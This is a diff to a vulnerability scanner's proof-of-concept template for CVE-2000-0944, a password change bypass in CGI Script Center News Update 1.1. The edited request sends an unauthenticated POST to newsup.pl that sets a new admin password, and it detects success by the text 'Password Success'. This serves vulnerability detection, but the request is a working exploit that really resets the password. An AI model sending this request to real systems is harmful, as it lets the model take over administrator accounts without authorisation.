@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "验证 CGI Script Center News Update 1.1 管理员密码修改验证绕过漏洞，攻击者无需原密码即可修改管理员密码"
+description = "检测 CGI Script Center News Update 1.1 管理员密码修改绕过漏洞。通过向 newsup.pl 发送未经验证的 POST 请求，无需原密码即可重置管理员密码。响应包含 'Password Success' 即表示漏洞存在。"
 id = "POC-AVE-2000-0690"
 name = "CVE-2000-0944 PoC"
 severity = "critical"
@@ -15,12 +15,12 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/cgi-bin/news/update/admin/password.pl"
+path = "/{{BaseURL}}/cgi-bin/dummy/newsup/newsup.pl"
 protocol = "http"
 
 [poc.requests.body]
-content = "new_password=newpass123&confirm_password=newpass123&submit=Change+Password"
-type = "form"
+content = "pwd=morpheus&pwd2=morpheus&setpwd=++Set+Password++"
+type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
@@ -30,14 +30,4 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = [
-    "password changed",
-    "successfully",
-    "updated",
-    "success",
-]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
+words = ["Password Success"]
